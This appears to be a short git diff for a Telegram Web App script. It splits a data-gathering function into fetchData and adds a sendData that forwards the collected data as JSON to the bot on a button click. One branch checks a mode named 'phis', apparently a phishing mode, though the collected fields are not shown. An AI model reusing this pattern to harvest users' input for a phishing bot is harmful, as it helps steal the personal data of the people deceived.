@@ -1,6 +1,6 @@
 var tg = window.Telegram.WebApp;
 
-function sendData()
+function fetchData()
 {
     let data = {};
     if (MODE == "phis")
@@ -34,6 +34,12 @@ function sendData()
     }
 
     return data;
+}
+
+function sendData()
+{
+    let data = fetchData();
+    tg.sendData(JSON.stringify(data));
 }
 
 tg.onEvent('mainButtonClicked', sendData);
